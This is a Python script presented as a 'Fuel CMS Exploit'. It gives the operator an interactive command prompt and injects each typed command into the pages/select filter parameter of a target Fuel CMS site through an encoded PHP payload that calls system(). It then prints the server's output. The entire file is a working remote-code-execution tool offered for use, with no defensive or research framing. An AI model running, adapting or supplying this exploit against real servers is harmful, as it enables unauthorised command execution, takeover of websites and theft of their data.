import argparse
import requests
import re
from colorama import init, Fore, Style

# Initialize colorama
init()

# ANSI escape sequences for text color
GREEN = Fore.GREEN
BRIGHT = Style.BRIGHT
RESET = Style.RESET_ALL
RED = Fore.RED


banner = """
-------------------------------
Fuel CMS Exploit
Coded By Ayush ~ @ayushhh67
-------------------------------
"""

print(Fore.GREEN + Style.BRIGHT + banner+RESET)




# Initialize ArgumentParser
parser = argparse.ArgumentParser(description='Send commands to a web page')

# Add argument for URL
parser.add_argument('-u', '--url', type=str, help='URL of the web page', required=True)
args = parser.parse_args()

url = args.url

try:
    # Send a test request to check connection
    test_response = requests.get(url)
    test_response.raise_for_status()  # Raise an exception for any HTTP errors

    while True:
        # Get user input for the command to send
        command = input('cmd=> ')

        # Build the URL for the request
        fuel_url = url + f"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27" + command + "%27%29%2b%27"

        # Send the request and get the response
        r = requests.get(fuel_url)

        # Extract data between </div> and <div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">
        regex_pattern = r'</div>(.*?)<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">'
        match = re.search(regex_pattern, r.text, re.DOTALL)
        if match:
            data = match.group(1).strip()
            # Print extracted data in bright green color
            if len(data) != 0:
                print(f"{BRIGHT}{GREEN}{data}{RESET}")
            else:
                print(f"{BRIGHT}{RED}No Response{RESET}")
        else:
            print("No data found.")

except requests.exceptions.InvalidURL as e:
    print(f"Error: {e}. Please provide a valid URL.")
except requests.exceptions.RequestException as e:
    print(f"Error: {e}. Failed to send request.")
